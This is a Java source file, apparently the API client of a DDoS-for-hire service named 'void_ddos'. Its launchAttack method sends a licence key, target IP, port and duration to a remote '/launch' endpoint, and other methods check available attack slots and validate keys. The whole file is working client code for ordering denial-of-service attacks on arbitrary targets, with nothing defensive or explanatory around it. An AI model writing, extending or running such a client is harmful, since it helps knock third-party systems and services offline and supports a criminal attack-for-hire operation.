package com.void_ddos;

import org.json.JSONObject;
import java.io.*;
import java.net.*;

public class ApiClient {

    public static String launchAttack(String base, String key,
            String ip, int port, int duration) throws Exception {
        URL url = new URL(base + "/launch");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(10000);
        conn.setDoOutput(true);

        JSONObject body = new JSONObject();
        body.put("key", key);
        body.put("ip", ip);
        body.put("port", port);
        body.put("duration", duration);

        OutputStream os = conn.getOutputStream();
        os.write(body.toString().getBytes("UTF-8"));
        os.flush();
        os.close();

        return readResponse(conn);
    }

    public static String getSlots(String base) throws Exception {
        URL url = new URL(base + "/slots");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        return readResponse(conn);
    }

    public static String validateKey(String base, String key) throws Exception {
        URL url = new URL(base + "/validate");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        conn.setDoOutput(true);

        JSONObject body = new JSONObject();
        body.put("key", key);

        OutputStream os = conn.getOutputStream();
        os.write(body.toString().getBytes("UTF-8"));
        os.flush();
        os.close();

        return readResponse(conn);
    }

    private static String readResponse(HttpURLConnection conn) throws Exception {
        InputStream is;
        try {
            is = conn.getInputStream();
        } catch (Exception e) {
            is = conn.getErrorStream();
            if (is == null) throw e;
        }
        BufferedReader br = new BufferedReader(
                new InputStreamReader(is, "UTF-8"));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line);
        br.close();
        return sb.toString();
    }
}